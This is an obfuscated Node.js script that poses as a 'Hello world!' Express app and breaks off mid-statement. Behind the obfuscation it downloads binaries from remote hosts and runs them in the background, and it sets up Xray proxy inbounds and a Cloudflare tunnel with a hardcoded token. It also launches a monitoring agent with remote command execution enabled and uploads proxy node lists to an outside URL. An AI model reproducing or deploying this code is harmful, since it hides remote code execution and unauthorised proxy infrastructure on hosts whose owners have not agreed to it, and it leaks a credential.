const _0x307b38=_0x48c0;(function(_0x5958ed,_0x1f5f57){const _0x507db6={_0x19e54e:0x220,_0x4f2ac0:0x2a8,_0x2cd2bc:0x1f4,_0x2d0a6b:0x245,_0x25abba:0x23a,_0x29b5c2:0x265},_0x31f610=_0x48c0,_0x19cdf2=_0x5958ed();while(!![]){try{const _0x36cbba=-parseInt(_0x31f610(_0x507db6._0x19e54e))/0x1+parseInt(_0x31f610(0x26d))/0x2*(parseInt(_0x31f610(0x23b))/0x3)+-parseInt(_0x31f610(0x221))/0x4*(parseInt(_0x31f610(_0x507db6._0x4f2ac0))/0x5)+-parseInt(_0x31f610(_0x507db6._0x2cd2bc))/0x6*(-parseInt(_0x31f610(0x1f2))/0x7)+-parseInt(_0x31f610(_0x507db6._0x2d0a6b))/0x8*(parseInt(_0x31f610(_0x507db6._0x25abba))/0x9)+-parseInt(_0x31f610(0x236))/0xa*(parseInt(_0x31f610(0x275))/0xb)+parseInt(_0x31f610(_0x507db6._0x29b5c2))/0xc;if(_0x36cbba===_0x1f5f57)break;else _0x19cdf2['push'](_0x19cdf2['shift']());}catch(_0x3555cf){_0x19cdf2['push'](_0x19cdf2['shift']());}}}(_0x417e,0x1b5dd));const express=require(_0x307b38(0x29a)),app=express(),axios=require(_0x307b38(0x259)),os=require('os'),fs=require('fs'),path=require(_0x307b38(0x22c)),{promisify}=require(_0x307b38(0x23c)),exec=promisify(require(_0x307b38(0x280))[_0x307b38(0x23f)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x307b38(0x2a7)][_0x307b38(0x1ef)]||'',PROJECT_URL=process[_0x307b38(0x2a7)][_0x307b38(0x26a)]||'',AUTO_ACCESS=process[_0x307b38(0x2a7)][_0x307b38(0x269)]||![],FILE_PATH=process[_0x307b38(0x2a7)][_0x307b38(0x273)]||_0x307b38(0x21d),SUB_PATH=process[_0x307b38(0x2a7)][_0x307b38(0x260)]||_0x307b38(0x243),PORT=process[_0x307b38(0x2a7)][_0x307b38(0x1ff)]||process[_0x307b38(0x2a7)]['PORT']||0xbb8,UUID=process[_0x307b38(0x2a7)][_0x307b38(0x251)]||_0x307b38(0x22b),NEZHA_SERVER=process[_0x307b38(0x2a7)][_0x307b38(0x2a6)]||'',NEZHA_PORT=process['env'][_0x307b38(0x241)]||'',NEZHA_KEY=process[_0x307b38(0x2a7)][_0x307b38(0x2a2)]||'',ARGO_DOMAIN=process[_0x307b38(0x2a7)][_0x307b38(0x262)]||_0x307b38(0x27f),ARGO_AUTH=process[_0x307b38(0x2a7)][_0x307b38(0x28a)]||_0x307b38(0x200),ARGO_PORT=process[_0x307b38(0x2a7)]['ARGO_PORT']||0x1f41,CFIP=process['env']['CFIP']||_0x307b38(0x263),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process['env'][_0x307b38(0x219)]||_0x307b38(0x20b);function _0x48c0(_0x192c94,_0x140a79){const _0x417e2d=_0x417e();return _0x48c0=function(_0x48c005,_0x5ceb93){_0x48c005=_0x48c005-0x1e0;let _0x453e4e=_0x417e2d[_0x48c005];return _0x453e4e;},_0x48c0(_0x192c94,_0x140a79);}!fs[_0x307b38(0x208)](FILE_PATH)?(fs[_0x307b38(0x227)](FILE_PATH),console[_0x307b38(0x20a)](FILE_PATH+_0x307b38(0x24a))):console['log'](FILE_PATH+_0x307b38(0x1fd));function generateRandomName(){const _0x38f490={_0x9e9492:0x285,_0x450e40:0x217,_0x4a172b:0x224},_0x3e2ffa=_0x307b38,_0x3a3bbe=_0x3e2ffa(_0x38f490._0x9e9492);let _0x234763='';for(let _0x57b5ca=0x0;_0x57b5ca<0x6;_0x57b5ca++){_0x234763+=_0x3a3bbe[_0x3e2ffa(_0x38f490._0x450e40)](Math[_0x3e2ffa(_0x38f490._0x4a172b)](Math[_0x3e2ffa(0x284)]()*_0x3a3bbe['length']));}return _0x234763;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x307b38(0x279)](FILE_PATH,npmName),phpPath=path[_0x307b38(0x279)](FILE_PATH,phpName),webPath=path[_0x307b38(0x279)](FILE_PATH,webName),botPath=path[_0x307b38(0x279)](FILE_PATH,botName),subPath=path[_0x307b38(0x279)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x307b38(0x258)),bootLogPath=path['join'](FILE_PATH,_0x307b38(0x238)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x3b6c4e={_0x31256b:0x286,_0x1817c5:0x214,_0x4db42e:0x24c,_0x2dfe17:0x278,_0x232b3c:0x21e},_0xc10156=_0x307b38;try{if(!UPLOAD_URL)return;if(!fs[_0xc10156(0x208)](subPath))return;let _0x852b45;try{_0x852b45=fs['readFileSync'](subPath,_0xc10156(0x286));}catch{return null;}const _0xd7c417=Buffer[_0xc10156(0x29e)](_0x852b45,_0xc10156(0x1f9))[_0xc10156(0x27e)](_0xc10156(_0x3b6c4e._0x31256b)),_0x107f12=_0xd7c417[_0xc10156(0x24b)]('\x0a')[_0xc10156(0x254)](_0x28e6da=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xc10156(0x28e)](_0x28e6da));if(_0x107f12[_0xc10156(_0x3b6c4e._0x1817c5)]===0x0)return;return axios[_0xc10156(_0x3b6c4e._0x4db42e)](UPLOAD_URL+_0xc10156(0x28c),JSON[_0xc10156(_0x3b6c4e._0x2dfe17)]({'nodes':_0x107f12}),{'headers':{'Content-Type':'application/json'}})[_0xc10156(_0x3b6c4e._0x232b3c)](_0x9a5a5=>{return null;}),null;}catch(_0x4e3651){return null;}}function cleanupOldFiles(){const _0x29fb00={_0x1745b0:0x230},_0xf795b6={_0x563a38:0x279,_0x50654b:0x213},_0x9474b7=_0x307b38;try{const _0x20815b=fs[_0x9474b7(0x21b)](FILE_PATH);_0x20815b[_0x9474b7(_0x29fb00._0x1745b0)](_0x11c430=>{const _0x48a816=_0x9474b7,_0x49a52b=path[_0x48a816(_0xf795b6._0x563a38)](FILE_PATH,_0x11c430);try{const _0xcdf042=fs[_0x48a816(0x295)](_0x49a52b);_0xcdf042['isFile']()&&fs[_0x48a816(_0xf795b6._0x50654b)](_0x49a52b);}catch(_0x6a6403){}});}catch(_0x1d0832){}}app[_0x307b38(0x28d)]('/',function(_0x5945be,_0x464e8e){const _0x404fba={_0x5bdb87:0x299},_0x695aaa=_0x307b38;_0x464e8e['send'](_0x695aaa(_0x404fba._0x5bdb87));});async function generateConfig(){const _0x37206a={_0xcedcf5:0x222,_0x159040:0x1e8,_0x11ebea:0x25c,_0x5d5361:0x215,_0x585336:0x1fe,_0x2539d9:0x248,_0x7b4830:0x1e8,_0x465ae6:0x1fe,_0xfa8a5d:0x28f,_0x1f34fa:0x21c,_0x462f0b:0x20d,_0x3d7fb1:0x283,_0x1c6220:0x281,_0xb3a540:0x277},_0x5d127a=_0x307b38,_0x56114c={'log':{'access':'/dev/null','error':_0x5d127a(0x29b),'loglevel':_0x5d127a(_0x37206a._0xcedcf5)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5d127a(_0x37206a._0x159040),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x5d127a(_0x37206a._0x11ebea),'dest':0xbba},{'path':_0x5d127a(_0x37206a._0x5d5361),'dest':0xbbb},{'path':_0x5d127a(0x28f),'dest':0xbbc}]},'streamSettings':{'network':_0x5d127a(_0x37206a._0x585336)}},{'port':0xbb9,'listen':_0x5d127a(_0x37206a._0x2539d9),'protocol':_0x5d127a(_0x37206a._0x7b4830),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x5d127a(_0x37206a._0x465ae6),'security':_0x5d127a(0x222)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x5d127a(0x1e8),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5d127a(0x222)},'streamSettings':{'network':'ws','security':_0x5d127a(0x222),'wsSettings':{'path':_0x5d127a(_0x37206a._0x11ebea)}},'sniffing':{'enabled':!![],'destOverride':[_0x5d127a(0x29c),_0x5d127a(0x216),_0x5d127a(0x21c)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x5d127a(0x1ec),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5d127a(0x29c),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5d127a(0x248),'protocol':_0x5d127a(0x292),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5d127a(_0x37206a._0xcedcf5),'wsSettings':{'path':_0x5d127a(_0x37206a._0xfa8a5d)}},'sniffing':{'enabled':!![],'destOverride':[_0x5d127a(0x29c),_0x5d127a(0x216),_0x5d127a(_0x37206a._0x1f34fa)],'metadataOnly':![]}}],'dns':{'servers':[_0x5d127a(_0x37206a._0x462f0b)]},'outbounds':[{'protocol':_0x5d127a(0x233),'tag':_0x5d127a(_0x37206a._0x3d7fb1)},{'protocol':_0x5d127a(0x207),'tag':_0x5d127a(_0x37206a._0x1c6220)}]};fs[_0x5d127a(0x29d)](path[_0x5d127a(0x279)](FILE_PATH,_0x5d127a(_0x37206a._0xb3a540)),JSON['stringify'](_0x56114c,null,0x2));}function getSystemArchitecture(){const _0x2f2b86={_0x1fe849:0x296},_0x1b72dc=_0x307b38,_0x2f9bfd=os['arch']();return _0x2f9bfd==='arm'||_0x2f9bfd===_0x1b72dc(0x249)||_0x2f9bfd===_0x1b72dc(0x1e7)?_0x1b72dc(_0x2f2b86._0x1fe849):_0x1b72dc(0x1fb);}function downloadFile(_0x59c4b8,_0x206081,_0x5012ad){const _0x58aae1={_0xbea62e:0x227,_0x1f2b6e:0x27a},_0x44bb5f={_0x457e42:0x229,_0x83ab78:0x29f},_0x453407={_0x1cf26a:0x20a,_0x5f3c12:0x256},_0x1c35d1=_0x307b38,_0x3e20b4=_0x59c4b8;!fs['existsSync'](FILE_PATH)&&fs[_0x1c35d1(_0x58aae1._0xbea62e)](FILE_PATH,{'recursive':!![]});const _0x374abe=fs[_0x1c35d1(0x291)](_0x3e20b4);axios({'method':'get','url':_0x206081,'responseType':_0x1c35d1(0x290)})[_0x1c35d1(_0x58aae1._0x1f2b6e)](_0x1b4cea=>{const _0xbb326f={_0x3a3b09:0x237,_0x5689f8:0x256,_0x340b95:0x29f,_0x25d6a4:0x257,_0x4910f0:0x20e},_0x33a3b1=_0x1c35d1;_0x1b4cea[_0x33a3b1(0x1e9)]['pipe'](_0x374abe),_0x374abe['on']('finish',()=>{const _0x4700a1=_0x33a3b1;_0x374abe[_0x4700a1(0x2a1)](),console[_0x4700a1(_0x453407._0x1cf26a)](_0x4700a1(_0x453407._0x5f3c12)+path[_0x4700a1(0x229)](_0x3e20b4)+_0x4700a1(0x261)),_0x5012ad(null,_0x3e20b4);}),_0x374abe['on'](_0x33a3b1(0x20e),_0x47026c=>{const _0x21b795=_0x33a3b1;fs[_0x21b795(_0xbb326f._0x3a3b09)](_0x3e20b4,()=>{});const _0x34e51e=_0x21b795(_0xbb326f._0x5689f8)+path['basename'](_0x3e20b4)+_0x21b795(_0xbb326f._0x340b95)+_0x47026c[_0x21b795(_0xbb326f._0x25d6a4)];console[_0x21b795(_0xbb326f._0x4910f0)](_0x34e51e),_0x5012ad(_0x34e51e);});})['catch'](_0x4e9a68=>{const _0x706e42=_0x1c35d1,_0xf3bc52=_0x706e42(0x256)+path[_0x706e42(_0x44bb5f._0x457e42)](_0x3e20b4)+_0x706e42(_0x44bb5f._0x83ab78)+_0x4e9a68[_0x706e42(0x257)];console[_0x706e42(0x20e)](_0xf3bc52),_0x5012ad(_0xf3bc52);});}async function downloadFilesAndRun(){const _0x24dd9d={_0x1d8137:0x214,_0x1a7025:0x20a,_0x597360:0x25d,_0x24b747:0x232,_0x11af02:0x24b,_0x3506ab:0x297,_0x433606:0x25b,_0x564588:0x205,_0x27e1d2:0x1ee,_0x596958:0x206,_0x543653:0x29d,_0x559220:0x226,_0x1be9ee:0x20a,_0x13bcae:0x20e,_0x28b4ca:0x232,_0x52369c:0x1e4,_0x50b31a:0x255,_0x489c6e:0x2a5,_0x5af01b:0x26b,_0x86dcec:0x223,_0x5e3b7d:0x255,_0x4948b0:0x272,_0x22206e:0x23d,_0x4223c3:0x244,_0x41f4df:0x1e5,_0x56edcd:0x267,_0x33500f:0x28b,_0x1dacdd:0x235,_0x4bbda8:0x287,_0x3041bf:0x20e},_0xe8728b={_0x579d8d:0x230},_0x1873ca={_0x314eb7:0x282},_0x5ce39b={_0x3d6953:0x268},_0x3b12d4=_0x307b38,_0x44f76f=getSystemArchitecture(),_0x33148c=getFilesForArchitecture(_0x44f76f);if(_0x33148c[_0x3b12d4(_0x24dd9d._0x1d8137)]===0x0){console[_0x3b12d4(_0x24dd9d._0x1a7025)](_0x3b12d4(0x271));return;}const _0xb02eb3=_0x33148c[_0x3b12d4(_0x24dd9d._0x597360)](_0x457eab=>{return new Promise((_0x713fc4,_0x525ba9)=>{const _0x281eda=_0x48c0;downloadFile(_0x457eab[_0x281eda(_0x5ce39b._0x3d6953)],_0x457eab['fileUrl'],(_0x174467,_0x28a9f4)=>{_0x174467?_0x525ba9(_0x174467):_0x713fc4(_0x28a9f4);});});});try{await Promise['all'](_0xb02eb3);}catch(_0x5257fb){console['error'](_0x3b12d4(0x20c),_0x5257fb);return;}function _0x1515d4(_0x40dbc2){const _0x335d7b={_0x41e47d:0x20e},_0x2fdd51=_0x3b12d4,_0x186259=0x1fd;_0x40dbc2[_0x2fdd51(_0xe8728b._0x579d8d)](_0x5da918=>{const _0xa81746=_0x2fdd51;fs['existsSync'](_0x5da918)&&fs[_0xa81746(_0x1873ca._0x314eb7)](_0x5da918,_0x186259,_0x2d3d7f=>{const _0x5e86e1=_0xa81746;_0x2d3d7f?console[_0x5e86e1(_0x335d7b._0x41e47d)](_0x5e86e1(0x253)+_0x5da918+':\x20'+_0x2d3d7f):console[_0x5e86e1(0x20a)]('Empowerment\x20success\x20for\x20'+_0x5da918+':\x20'+_0x186259['toString'](0x8));});});}const _0x2b0716=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1515d4(_0x2b0716);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x59accf=NEZHA_SERVER[_0x3b12d4(_0x24dd9d._0x24b747)](':')?NEZHA_SERVER[_0x3b12d4(_0x24dd9d._0x11af02)](':')[_0x3b12d4(0x1fc)]():'',_0x157693=new Set(['443',_0x3b12d4(0x294),_0x3b12d4(0x293),_0x3b12d4(_0x24dd9d._0x3506ab),_0x3b12d4(_0x24dd9d._0x433606),_0x3b12d4(_0x24dd9d._0x564588)]),_0x50aabf=_0x157693[_0x3b12d4(0x1e2)](_0x59accf)?_0x3b12d4(_0x24dd9d._0x27e1d2):_0x3b12d4(0x246),_0x1b5847=_0x3b12d4(0x250)+NEZHA_KEY+_0x3b12d4(_0x24dd9d._0x596958)+NEZHA_SERVER+_0x3b12d4(0x27d)+_0x50aabf+_0x3b12d4(0x264)+UUID;fs[_0x3b12d4(_0x24dd9d._0x543653)](path[_0x3b12d4(0x279)](FILE_PATH,_0x3b12d4(_0x24dd9d._0x559220)),_0x1b5847);const _0x317b93='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x317b93),console[_0x3b12d4(_0x24dd9d._0x1be9ee)](phpName+'\x20is\x20running'),await new Promise(_0x42a920=>setTimeout(_0x42a920,0x3e8));}catch(_0x3f48c1){console[_0x3b12d4(_0x24dd9d._0x13bcae)]('php\x20running\x20error:\x20'+_0x3f48c1);}}else{let _0x4d1938='';const _0x2d9716=['443',_0x3b12d4(0x294),'2096',_0x3b12d4(0x297),_0x3b12d4(0x25b),'2053'];_0x2d9716[_0x3b12d4(_0x24dd9d._0x28b4ca)](NEZHA_PORT)&&(_0x4d1938=_0x3b12d4(_0x24dd9d._0x52369c));const _0x28e6e3=_0x3b12d4(_0x24dd9d._0x50b31a)+npmPath+_0x3b12d4(_0x24dd9d._0x489c6e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3b12d4(0x252)+NEZHA_KEY+'\x20'+_0x4d1938+_0x3b12d4(_0x24dd9d._0x5af01b);try{await exec(_0x28e6e3),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x25688c=>setTimeout(_0x25688c,0x3e8));}catch(_0x1f8a59){console[_0x3b12d4(_0x24dd9d._0x13bcae)](_0x3b12d4(_0x24dd9d._0x86dcec)+_0x1f8a59);}}}else console[_0x3b12d4(0x20a)](_0x3b12d4(0x202));const _0x11fa9b=_0x3b12d4(_0x24dd9d._0x5e3b7d)+webPath+_0x3b12d4(_0x24dd9d._0x4948b0)+FILE_PATH+_0x3b12d4(_0x24dd9d._0x22206e);try{await exec(_0x11fa9b),console['log'](webName+_0x3b12d4(0x287)),await new Promise(_0x4529c1=>setTimeout(_0x4529c1,0x3e8));}catch(_0x488bce){console[_0x3b12d4(0x20e)]('web\x20running\x20error:\x20'+_0x488bce);}if(fs[_0x3b12d4(0x208)](botPath)){let _0x25f76d;if(ARGO_AUTH[_0x3b12d4(_0x24dd9d._0x4223c3)](/^[A-Z0-9a-z=]{120,250}$/))_0x25f76d=_0x3b12d4(_0x24dd9d._0x41f4df)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x25f76d=_0x3b12d4(_0x24dd9d._0x56edcd)+FILE_PATH+_0x3b12d4(_0x24dd9d._0x33500f):_0x25f76d=_0x3b12d4(_0x24dd9d._0x1dacdd)+FILE_PATH+_0x3b12d4(0x201)+ARGO_PORT;try{await exec(_0x3b12d4(0x255)+botPath+'\x20'+_0x25f76d+_0x3b12d4(0x270)),console[_0x3b12d4(0x20a)](botName+_0x3b12d4(_0x24dd9d._0x4bbda8)),await new Promise(_0x364ffd=>setTimeout(_0x364ffd,0x7d0));}catch(_0x29a112){console[_0x3b12d4(_0x24dd9d._0x3041bf)](_0x3b12d4(0x218)+_0x29a112);}}await new Promise(_0x25ed90=>setTimeout(_0x25ed90,0x1388));}function getFilesForArchitecture(_0x1acb3e){const _0x4330e2={_0xae6e9:0x296,_0x2a4a15:0x209,_0x543889:0x24d},_0x35c613=_0x307b38;let _0x4a804b;_0x1acb3e===_0x35c613(_0x4330e2._0xae6e9)?_0x4a804b=[{'fileName':webPath,'fileUrl':_0x35c613(_0x4330e2._0x2a4a15)},{'fileName':botPath,'fileUrl':_0x35c613(0x228)}]:_0x4a804b=[{'fileName':webPath,'fileUrl':_0x35c613(0x1f7)},{'fileName':botPath,'fileUrl':_0x35c613(_0x4330e2._0x543889)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3258ad=_0x1acb3e===_0x35c613(0x296)?'https://arm64.ssss.nyc.mn/agent':_0x35c613(0x240);_0x4a804b['unshift']({'fileName':npmPath,'fileUrl':_0x3258ad});}else{const _0x53f2d0=_0x1acb3e===_0x35c613(_0x4330e2._0xae6e9)?'https://arm64.ssss.nyc.mn/v1':_0x35c613(0x22d);_0x4a804b[_0x35c613(0x25a)]({'fileName':phpPath,'fileUrl':_0x53f2d0});}}return _0x4a804b;}function _0x417e(){const _0x356c4d=['readFileSync','true','UPLOAD_URL','tunnel.json','\x0a\x20\x20\x20\x20','61747YpaSgb','ARGO_DOMAIN:','30MwLpJH','tunnel.yml','?security=tls&sni=','https://amd64.ssss.nyc.mn/web','&path=%2Fvless-argo%3Fed%3D2560#','base64','TunnelSecret','amd','pop','\x20already\x20exists','tcp','SERVER_PORT','eyJhIjoiNDE4ODVjYTc5NjQ0MjQzOTE2Y2Y3NWI1ZjNhNWQ5NjciLCJ0IjoiOTc2MTdhOTAtNzRmYS00M2JlLThiODktMTFkNGI0Y2VkMDk5IiwicyI6Ik0yWm1NbU5sTUdRdE1ETmpZUzAwWlRjd0xXSmpPRFF0WXpSallUY3hNVFV3TWpsaiJ9','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','NEZHA\x20variable\x20is\x20empty,skip\x20running','text/plain;\x20charset=utf-8','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','2053','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','blackhole','existsSync','https://arm64.ssss.nyc.mn/web','log','september','Error\x20downloading\x20files:','https+local://8.8.8.8/dns-query','error','http\x20server\x20is\x20running\x20on\x20port:','taskkill\x20/f\x20/im\x20','/vmess-argo?ed=2560','application/json','unlinkSync','length','/vmess-argo','tls','charAt','Error\x20executing\x20command:\x20','NAME','push','readdirSync','quic','./tmp','catch','platform','75384DISYtz','4dvRDcW','none','npm\x20running\x20error:\x20','floor','\x0a\x0atrojan://','config.yaml','mkdirSync','https://arm64.ssss.nyc.mn/bot','basename','country_code','2e8a12d6-87db-4035-890d-6241d6fe7ffa','path','https://amd64.ssss.nyc.mn/v1','success','response','forEach','\x0a\x0avmess://','includes','freedom','\x20>/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','1140FuirYz','unlink','boot.log','App\x20is\x20running','1853496AASBBi','3Mweqkz','util','/config.json\x20>/dev/null\x202>&1\x20&','pkill\x20-f\x20\x22[','exec','https://amd64.ssss.nyc.mn/agent','NEZHA_PORT','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','sub','match','8ZdhJhm','false','org','127.0.0.1','arm64','\x20is\x20created','split','post','https://amd64.ssss.nyc.mn/bot','ArgoDomain:','Unhandled\x20error\x20in\x20startserver:','\x0aclient_secret:\x20','UUID','\x20-p\x20','Empowerment\x20failed\x20for\x20','filter','nohup\x20','Download\x20','message','list.txt','axios','unshift','2083','/vless-argo','map','.exe\x20>\x20nul\x202>&1','countryCode','SUB_PATH','\x20successfully','ARGO_DOMAIN','september.dpdns.org','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','3831372GwFSQp','?encryption=none&security=tls&sni=','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','fileName','AUTO_ACCESS','PROJECT_URL','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','rm\x20-rf\x20','222270gaMYkl','clear','status','\x20>/dev/null\x202>&1\x20&','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20-c\x20','FILE_PATH','https://oooo.serv00.net/add-url','1573FynxJJ','Nodes\x20uploaded\x20successfully','config.json','stringify','join','then','\x0avless://','\x22\x20>\x20/dev/null\x202>&1','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','toString','lagune.september.dpdns.org','child_process','block','chmod','direct','random','abcdefghijklmnopqrstuvwxyz','utf-8','\x20is\x20running','send','&fp=firefox&type=ws&host=','ARGO_AUTH','/tunnel.yml\x20run','/api/delete-nodes','get','test','/trojan-argo','stream','createWriteStream','trojan','2096','8443','statSync','arm','2087','/sub.txt\x20saved\x20successfully','Hello\x20world!','express','/dev/null','http','writeFileSync','from','\x20failed:\x20','Error\x20reading\x20boot.log:','close','NEZHA_KEY','&path=%2Ftrojan-argo%3Fed%3D2560#','substring','\x20-s\x20','NEZHA_SERVER','env','323990gzPusO','Unknown','http://ip-api.com/json/','del\x20/f\x20/q\x20','has','set','--tls','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','listen','aarch64','vless','data','Add\x20automatic\x20access\x20task\x20faild:\x20','Error\x20in\x20startserver:','vmess'];_0x417e=function(){return _0x356c4d;};return _0x417e();}function argoType(){const _0xc72b2b={_0x579da5:0x232,_0x3a8829:0x1fa,_0x3e45f6:0x24b,_0x11497c:0x279,_0x2fc55e:0x29d,_0x5499a4:0x1f5},_0x469de0=_0x307b38;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x469de0(_0xc72b2b._0x579da5)](_0x469de0(_0xc72b2b._0x3a8829))){fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x2c2c5e='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x469de0(_0xc72b2b._0x3e45f6)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x469de0(_0xc72b2b._0x11497c)](FILE_PATH,_0x469de0(0x1f0))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x469de0(_0xc72b2b._0x2fc55e)](path['join'](FILE_PATH,_0x469de0(_0xc72b2b._0x5499a4)),_0x2c2c5e);}else console[_0x469de0(0x20a)](_0x469de0(0x242));}async function extractDomains(){const _0x19bc39={_0x4ce445:0x20a,_0x586c9b:0x1f3,_0x31fe2c:0x1ed,_0x2603c9:0x279,_0x12cfa7:0x230,_0x193b92:0x201,_0x3de912:0x270,_0x51eef2:0x2a0},_0x1103c5={_0x32080a:0x28d,_0x3606ec:0x22a,_0x5bd03c:0x247,_0x3c3039:0x1e9,_0x1abaf4:0x247,_0x36f629:0x28d,_0x3d8b73:0x25f,_0x43cac9:0x247,_0x419fda:0x247,_0x2c7621:0x2a9},_0x5a4253={_0x5a5940:0x21f,_0x31cc1e:0x210,_0x37bbf5:0x25e,_0x1766a8:0x27c},_0x3fd3b6={_0x23b538:0x244},_0x5ac4c0=_0x307b38;let _0x482a9c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x482a9c=ARGO_DOMAIN,console[_0x5ac4c0(_0x19bc39._0x4ce445)](_0x5ac4c0(_0x19bc39._0x586c9b),_0x482a9c),await _0x169e34(_0x482a9c);else try{const _0x1e4e86=fs[_0x5ac4c0(_0x19bc39._0x31fe2c)](path[_0x5ac4c0(_0x19bc39._0x2603c9)](FILE_PATH,'boot.log'),'utf-8'),_0x4599a5=_0x1e4e86[_0x5ac4c0(0x24b)]('\x0a'),_0x444499=[];_0x4599a5[_0x5ac4c0(_0x19bc39._0x12cfa7)](_0x2aed83=>{const _0x3b4fe9=_0x5ac4c0,_0x254169=_0x2aed83[_0x3b4fe9(_0x3fd3b6._0x23b538)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x254169){const _0x5de64d=_0x254169[0x1];_0x444499['push'](_0x5de64d);}});if(_0x444499['length']>0x0)_0x482a9c=_0x444499[0x0],console[_0x5ac4c0(_0x19bc39._0x4ce445)](_0x5ac4c0(0x24e),_0x482a9c),await _0x169e34(_0x482a9c);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x5ac4c0(0x213)](path['join'](FILE_PATH,_0x5ac4c0(0x238)));async function _0x5d5477(){const _0x377b50=_0x5ac4c0;try{process[_0x377b50(_0x5a4253._0x5a5940)]==='win32'?await exec(_0x377b50(_0x5a4253._0x31cc1e)+botName+_0x377b50(_0x5a4253._0x37bbf5)):await exec(_0x377b50(0x23e)+botName[_0x377b50(0x217)](0x0)+']'+botName[_0x377b50(0x2a4)](0x1)+_0x377b50(_0x5a4253._0x1766a8));}catch(_0x23e275){}}_0x5d5477(),await new Promise(_0x1707c1=>setTimeout(_0x1707c1,0xbb8));const _0x4b7593=_0x5ac4c0(0x235)+FILE_PATH+_0x5ac4c0(_0x19bc39._0x193b92)+ARGO_PORT;try{await exec(_0x5ac4c0(0x255)+botPath+'\x20'+_0x4b7593+_0x5ac4c0(_0x19bc39._0x3de912)),console[_0x5ac4c0(_0x19bc39._0x4ce445)](botName+_0x5ac4c0(0x287)),await new Promise(_0x24fdb3=>setTimeout(_0x24fdb3,0xbb8)),await extractDomains();}catch(_0x4e43f8){console['error']('Error\x20executing\x20command:\x20'+_0x4e43f8);}}}catch(_0x512a3f){console[_0x5ac4c0(0x20e)](_0x5ac4c0(_0x19bc39._0x51eef2),_0x512a3f);}async function _0x134205(){const _0x50bd1b=_0x5ac4c0;try{const _0x68edec=await axios[_0x50bd1b(_0x1103c5._0x32080a)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x68edec['data']&&_0x68edec[_0x50bd1b(0x1e9)][_0x50bd1b(_0x1103c5._0x3606ec)]&&_0x68edec[_0x50bd1b(0x1e9)][_0x50bd1b(_0x1103c5._0x5bd03c)])return _0x68edec[_0x50bd1b(_0x1103c5._0x3c3039)][_0x50bd1b(0x22a)]+'_'+_0x68edec[_0x50bd1b(0x1e9)][_0x50bd1b(_0x1103c5._0x1abaf4)];}catch(_0x476b20){try{const _0x24792e=await 